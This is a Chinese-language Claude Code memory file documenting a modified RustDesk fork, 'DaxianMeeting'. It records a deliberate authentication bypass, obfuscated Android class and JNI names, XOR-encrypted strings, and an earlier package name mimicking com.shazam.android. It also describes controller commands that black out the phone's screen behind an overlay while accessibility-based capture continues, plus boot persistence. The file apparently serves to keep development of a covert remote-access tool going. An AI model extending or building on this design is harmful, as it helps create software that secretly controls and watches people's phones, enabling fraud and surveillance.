# 大仙会议 v5.2.0 — 项目核心记忆

> 本文件是 Claude Code 持久化记忆。包含项目全部核心知识，防止上下文丢失。

---

## 1. 项目身份

- **项目名**：大仙会议 / DaxianMeeting / v5.2.0
- **包名**：`com.daxian.dev`
- **Rust crate**：`rustdesk`（Cargo.toml），lib name = `librustdesk`
- **运行时 APP_NAME**：`"DaxianMeeting"`（`libs/hbb_common/src/config.rs` line 65）
- **Android SO**：编译产出 `liblibrustdesk.so`，`build.sh` 重命名为 `libdaxian.so`
- **Windows DLL**：`librustdesk.dll`（未改名）
- **Deep link**：`daxian://`
- **历史包名迁移**：`com.shazam.android` → `com.xiaohao.helloworld` → `com.daxian.dev`

---

## 2. 认证旁路

`src/common.rs` 中两个关键函数已被修改：
- `is_custom_client()` → 强制返回 `false`
- `verify_login()` → 强制返回 `true`（原始 ed25519 验证已注释）

---

## 3. Android 类名混淆映射

| 混淆名 | 真实角色 |
|--------|---------|
| `oFtTiPzsqzBHGigp` | **FlutterActivity** — 主界面 |
| `DFm8Y8iMScvB2YDw` | **MainService** — MediaProjection 屏幕捕获服务 |
| `nZW99cdXQ0COhB2o` | **InputService** — AccessibilityService 输入分发+截图 |
| `XerQvgpGBzr8FDFr` | **PermissionRequestActivity** — 透明 Activity |
| `DFrLMwitwQbfu7AC` | **FloatWindowService** — 悬浮窗 |
| `EqljohYazB0qrhnj` | **ImageBufferHelper** — 截图缓冲处理 |
| `ig2xH1U3RDNsb7CS` | **ClipboardManager** |
| `BootReceiver` | 开机广播接收器（未混淆） |

所有 Android 敏感字符串通过 `p50.java`/`q50.java` XOR 加密，运行时 `p50.a(data, key)` 解密。

---

## 4. 双 FFI 桥架构

Android 端有两个 FFI 桥，都加载同一个 `libdaxian.so`：

- **ffi.kt**（`FFI` 对象）— 第一桥，函数名混淆（如 `e15f7cc69f667bd3` = createView）
- **pkg2230.kt**（`ClsFx9V0S` 对象）— 第二桥，是主力桥，被所有 Service import

Rust 侧 JNI 代码在 `libs/scrap/src/android/pkg2230.rs`（2209行），`ffi.rs` 是其完整备份。`mod.rs` 只导出 pkg2230：`pub mod pkg2230; pub use pkg2230::*;`

### 关键 JNI 方法映射

| ClsFx9V0S 方法 | 功能 |
|---------------|------|
| `yy4mmhjJ(buf)` | 正常模式帧入口 → VIDEO_RAW |
| `b6L3vlmP(new, global)` | 穿透(SKL)模式帧入口 |
| `T1s73AGm(new, global)` | 无视(shouldRun)模式帧入口 |
| `nE2NVDLW(bitmap, sx, sy)` | scaleBitmap |
| `SzGEET65(w, h)` | initializeBuffer |
| `uwEb8Ixn(service)` | getRootInActiveWindow |
| `DyXxszSR(ctx, wm, ...)` | createView (Overlay) |
| `NSac7E1O / l1NNA8cZ` | 绘制 Accessibility 节点 |
| `ygmLIEQ5(ctx)` | init Context |
| `xt4P9mWE(dir, cfg)` | startServer |
| `qR9Ofa6G()` | refreshScreen |
| `VaiKIoQu(name, val)` | setFrameRawEnable |
| `OCpC4h8m(key)` | getLocalOption |
| `BAEH1gRs()` | getNetArgs4 (scale factor) |
| `qJM6QNqR()` | getNetArgs5 (截图延迟ms) |

---

## 5. 三模式屏幕捕获

| 模式 | 标志 | 数据源 | JNI 入口 | 帧保护变量 |
|------|------|--------|----------|-----------|
| **正常** | `!SKL && !shouldRun` | ImageReader+MediaProjection | `yy4mmhjJ` | 直接入 VIDEO_RAW |
| **穿透(SKL)** | `SKL=true` | Accessibility 树递归渲染为 Bitmap | `b6L3vlmP` → `releaseBuffer` | `PIXEL_SIZEBack`（0=放行） |
| **无视(shouldRun)** | `shouldRun=true` | AccessibilityService.takeScreenshot() | `T1s73AGm` → `releaseBuffer8` | `PIXEL_SIZEBack8`（0=放行） |

三模式互斥：正常模式下 ImageReader listener 检查 `if(SKL || shouldRun) return`；开启无视会自动关闭穿透。

---

## 6. 自定义命令协议

控制端通过 `MouseEvent.url` + 自定义 `mask` 值传输命令。

**Protobuf**：`message.proto` MouseEvent 增加了 `string url = 5;`

**Mask 计算**：`mask = MOUSE_TYPE + (MOUSE_BUTTON_WHEEL << 3)`

| 功能 | mask | URL 格式 | 效果 |
|------|------|---------|------|
| 黑屏 | 37 | `Clipboard_Management\|122\|80\|4\|5\|255\|#1/#0` | Overlay 显示/隐藏 |
| 穿透 | 39 | `HardwareKeyboard_Management\|...\|#1/#0` | SKL=true/false |
| 无视 | 40 | `SUPPORTED_ABIS_Management0/1\|0\|1` | shouldRun 开/关 |
| 共享 | 41 | `Benchmarks_Management0/1\|0\|1` | kill/restore MediaProjection |

### 完整数据链路
```
Flutter overlay按钮 → input_model.dart tapXxx() → sendMouse(type, url)
→ flutter_ffi.rs type映射 (wheelblank→5等) → client.rs send_mouse()
→ protobuf 网络传输 → server/connection.rs 接收
→ pkg2230.rs call_main_service_pointer_input(mask分支)
→ call_main_service_set_by_name() JNI
→ DFm8Y8iMScvB2YDw.DFm8Y8iMScvB2YDwSBN(name, arg1)
```

### Rust 自定义 MOUSE_TYPE 常量（src/common.rs）
```rust
pub const MOUSE_TYPE_BLANK: i32 = 5;
pub const MOUSE_TYPE_BROWSER: i32 = 6;
pub const MOUSE_TYPE_Analysis: i32 = 7;
pub const MOUSE_TYPE_GoBack: i32 = 8;
pub const MOUSE_TYPE_START: i32 = 9;
pub const MOUSE_TYPE_STOP: i32 = 10;
```

---

## 7. 像素操作系统

`pkg2230.rs` 中有全局 `static mut` 变量控制帧像素变换：

| 变量 | 类型 | 用途 |
|------|------|------|
| `PIXEL_SIZE4` | u8 | Alpha 通道替换值 |
| `PIXEL_SIZE5` | u32 | RGB 乘法因子 |
| `PIXEL_SIZE6` | usize | 像素步长（4=RGBA） |
| `PIXEL_SIZE7` | u8 | 启用阈值 |
| `PIXEL_SIZE8` | u32 | RGB 上限 |
| `PIXEL_SIZEBack` | u32 | 穿透模式帧放行（0=放行，255=丢弃） |
| `PIXEL_SIZEBack8` | u32 | 无视模式帧放行（0=放行，255=丢弃） |

---

## 8. 用户验证系统

`flutter/lib/models/user_model.dart`：

- **ChinaNetworkTimeService**：NTP 服务器池 + HTTP Date 备选，防本地时间篡改
- **validateUser()**：解析 email 格式 `YYYYMMDDHHMI@UUID`，检查过期 + 设备绑定
- 到期倒计时显示在 `desktop/pages/connection_page.dart`

---

## 9. 全局状态变量 (common.kt)

| 变量 | 用途 |
|------|------|
| `SKL` | 穿透模式开关 |
| `shouldRun` | 无视模式开关（@Volatile） |
| `gohome` | Overlay 可见性（0=VISIBLE, 8=GONE） |
| `BIS` | Overlay 实际可见状态 |
| `SCREEN_INFO` | Info(width, height, scale, dpi) — 缩放后值 |
| `HomeWidth/Height/Dpi` | 原始屏幕尺寸 |

---

## 10. SO/DLL 命名四处同步链

Android 修改 SO 名时必须同步：

1. `build.sh` → `build_rust_lib_for_target()` 的 cp 行
2. `flutter/android/.../kotlin/ffi.kt` → `System.loadLibrary("xxx")`
3. `flutter/android/.../kotlin/pkg2230.kt` → `System.loadLibrary("xxx")`
4. `flutter/lib/models/native_model.dart` → `DynamicLibrary.open('libxxx.so')`

任何一处不匹配 → 闪屏后黑屏。

---

## 11. 构建系统

- **Android**：`build.sh`（Linux 构建服务器），工具链 `/opt/rustdesk-toolchain/`，签名 `signing.env`
- **Windows**：`build.py --flutter --release`
- 编译产出链：`cargo-ndk` → `liblibrustdesk.so` → build.sh 重命名 → `libdaxian.so`

---

## 12. 已知 Bug

1. **Virtual Display key 不匹配**：`src/virtual_display_manager.rs` 发送 `"rustdesk_virtual_displays"`，但 `flutter/lib/consts.dart` 期望 `"daxian_virtual_displays"`
2. `PIXEL_SIZE` 系列使用 `static mut`，有线程安全隐患
3. `ffi.rs` 是 `pkg2230.rs` 的冗余备份，修改需双份同步
4. `targetSdkVersion` 当前为 33，低于 Google Play 要求的 34+

---

## 13. Flutter overlay 按钮清单

`flutter/lib/common/widgets/overlay.dart` — 8 个 `AntiShakeButton`（800ms 防抖）：

开共享(绿) / 关共享(红) / 开无视(紫) / 关无视(灰) / 开黑屏(紫) / 关黑屏(灰) / 开穿透(紫) / 关穿透(灰)

回调注册在 `flutter/lib/common.dart` line ~1090。

---

## 修改历史

<!-- 在此记录每次重大修改，格式：日期 | 内容 | 涉及文件 -->
